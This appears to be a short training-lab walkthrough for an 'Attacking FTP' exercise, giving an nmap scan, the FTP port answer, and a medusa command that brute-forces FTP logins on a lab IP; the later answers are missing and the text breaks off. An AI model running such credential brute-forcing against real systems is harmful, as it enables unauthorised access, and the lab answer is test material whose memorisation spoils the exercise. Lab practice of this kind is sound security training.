**QUESTION 1**: What port is the FTP service running on? 

Let's do a nmap scan
```
sudo nmap -A -T4 <IP> -Pn
```

![](images/Attacking%20FTP/nmap.png)

Answer: **2121**
____
**QUESTION 2**: What username is available for the FTP server? 

We need to brute force the username and password using the lists provided in the resources.

```
medusa -U ./users.list  -P ./pws.list -h 10.129.203.6 -M ftp -n 2121
```

![]
____
**QUESTION 3**: Use the discovered username with its password to login via SSH and obtain the flag.txt file. Submit the contents as your answer.

____